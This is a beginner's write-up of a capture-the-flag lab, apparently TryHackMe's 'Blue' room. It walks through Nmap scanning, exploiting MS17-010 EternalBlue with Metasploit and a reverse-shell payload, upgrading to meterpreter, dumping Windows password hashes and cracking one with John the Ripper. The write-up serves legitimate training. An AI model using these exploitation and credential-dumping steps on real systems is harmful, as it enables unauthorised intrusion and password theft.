#CTF
**This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.**

## Recon - Nmap

We start with reconnaissance. The industry standart is [[Nmap]] and that is what I am using.
`nmap [ip]`  is enought for now, and the results are:

```
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown
MAC Address: 02:89:D8:BF:23:C3 (Unknown)
```

A lot of new ports that I haven't seen before. After some searching on google I saw that many of these ports are Microsoft related, that suggests that the machine is propably Windows.

So I need to find vulnerabilities on the machine. [[Nmap]] has **N**map **S**cripting **E**ngine (NSE) which has a lot of scripts. I am interested in the vuln section. So after running 
`nmap --script=vuln [ip]` I am prompted with a lof of them. Some are:

```
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.

| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).

```

Here I am going to exploit the second one , and thats why the room is called Blue, because of the name of that vulnerability called <font color=blue> Eternal Blue </font>.


## Gain Access - [[Metasploit]]

We are going to use Metasploit for this room and get familiar with it.
First I need to update it with `msfupdate`
And the start it with `msfconsole`

I need to `search` for something related with this vulnerability so I do it with
`search ms17-010` which I know from the Recon phase.
I am propted with 5 choises , and I am going to use the first one, called:

`0    exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption`

So I type `use 0` and I am in the module and now I need to see some options so I type
`show options`

```
   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), see https://d
                                             ocs.metasploit.com/docs/using-met
                                             asploit/basics/using-metasploit.h
                                             tml
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to
                                             use for authentication. Only affe
                                             cts Windows Server 2008 R2, Windo
                                             ws 7, Windows Embedded Standard 7
                                              target machines.
   SMBPass                         no        (Optional) The password for the s
                                             pecified username
   SMBUser                         no        (Optional) The username to authen
                                             ticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matc
                                             hes exploit Target. Only affects
                                             Windows Server 2008 R2, Windows 7
                                             , Windows Embedded Standard 7 tar
                                             get machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploi
                                             t Target. Only affects Windows Se
                                             rver 2008 R2, Windows 7, Windows
                                             Embedded Standard 7 target machin
                                             es.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.123.130    yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target

```

I definitely need to set RHOSTS and the payloads settings. So I type:
`set RHOSTS [enemy ip]` and also
`set payload windows/x64/shell/reverse_tcp`

I am ready so I `exploit` it and wait to do its magic!

## Escalate

I background this session with CTRL+Z and I make sure its there with `sessions -l`.
Next I need to seach how to convert a shell to meterpreter shell in metasploit.
I found the module for this job called `post/multi/manage/shell_to_meterpreter`
so I exit from my previous with `back` and use the above. I `show options` and for this one I need to 
`set SESSION [number of session with windows shell]` and I exploit!
Now I have a 3rd session with meterpreter!
I get into the meterpreter session and I run `shell` and I am in the windows machine!
With `whoami` I get `nt authority\system` which is good news.
I exit and go back to meterpreter. 
I need to migrare our process to this machine because we need to match the architecture of that machine.  So I `ps` and search for one stable process. A good bet is :

```
 1280  692   spoolsv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\spoolsv.exe
```


So I `migrate 1280` and we are good to go!
## Cracking

Now I need to find the passwords of the users and I can do that with the command
`hashdump` which gives me :

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

I see that we have a non default account named Jon , and that's what I am interested in.
I take the hashed password and save it to a .hash file on my local machine. 
First I need to find the type of the hash.
Going back to [[John The Ripper#Identifying Hashes]] I download the hash-id.py module and I run it.
I paste the hash and :
```
Possible Hashs:
[+] md5($pass.$salt) - Joomla
```

So I run [[John The Ripper]] with: 
`john Jon.hash --format=NT --wordlist=/opt/rockyou.txt`

And we have a result! I run 
`john --format=NT Desktop/Jon.hash --show` to see my results and I have the password <font color=red > alqfna22 </font>

## Find flags!

*Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!*

The hint for the first flag says _This flag can be found at the system root._
So I go back to my meterpreter console and I `cd ..` a couple times.
I `dir` and I find my first flag.

For the second we have _This flag can be found at the location where passwords are stored within Windows._
After some search online I find that the location for this one is `C:\Windows\System32\config`
and I have the second flag.

And for the third we have _This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved._
I am going back a few folder and I cd into Users, there I can find Jon. I do some diggin and I find my third flag in the Documments folder.
## Conclusion

Very intresting stuff! I got to know more about [[Nmap]] ,[[John The Ripper]], privilage escalation and Windows in general. The flags needed some patience to find, but all in all a very good machine.